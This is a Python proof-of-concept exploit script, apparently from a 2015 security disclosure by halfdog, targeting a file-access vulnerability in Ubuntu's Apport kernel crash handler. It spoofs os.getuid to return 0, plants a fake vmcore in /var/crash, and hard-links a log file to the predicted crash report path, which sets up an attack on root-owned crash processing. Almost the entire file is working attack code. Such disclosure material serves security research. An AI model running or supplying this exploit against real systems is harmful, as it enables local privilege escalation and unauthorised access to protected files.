#!/usr/bin/python3
# 
# This software is provided by the copyright owner "as is" and any
# expressed or implied warranties, including, but not limited to,
# the implied warranties of merchantability and fitness for a particular
# purpose are disclaimed. In no event shall the copyright owner be
# liable for any direct, indirect, incidential, special, exemplary or
# consequential damages, including, but not limited to, procurement
# of substitute goods or services, loss of use, data or profits or
# business interruption, however caused and on any theory of liability,
# whether in contract, strict liability, or tort, including negligence
# or otherwise, arising in any way out of the use of this software,
# even if advised of the possibility of such damage.
# 
# Copyright (c) 2015 halfdog <me (%) halfdog.net>
# 
# See http://www.halfdog.net/Security/2015/ApportKernelCrashdumpFileAccessVulnerabilities/ for more information.


import os
import apport
import apport.fileutils

# Make python believe we are uid=0, so that it creates the correct
# report file name.
def getuid():
  return 0
os.getuid=getuid

vmcorePath='/var/crash/vmcore'

# Write 1MB of random data as core dump.
randomFile=open('/dev/urandom', 'rb')
randomData=randomFile.read(1<<20)
randomFile.close()
coreFile=open(vmcorePath, 'wb')
coreFile.write(randomData)
coreFile.close()

# Just create the log for linking it later on.
logFile=open(vmcorePath+'.log', 'wb')
logFile.close()

pr = apport.Report('KernelCrash')
package = apport.packaging.get_kernel_package()
try:
    package_version = apport.packaging.get_version(package)
except ValueError as e:
    if 'does not exist' in e.message:
        package_version = 'unknown'
pr['Package'] = '%s %s' % (package, package_version)

pr.add_os_info()
pr['VmCoreLog'] = (vmcorePath+'.log',)
pr['VmCore'] = (vmcorePath,)

reportFileName=apport.fileutils.make_report_path(pr)
os.link(vmcorePath+'.log', reportFileName)
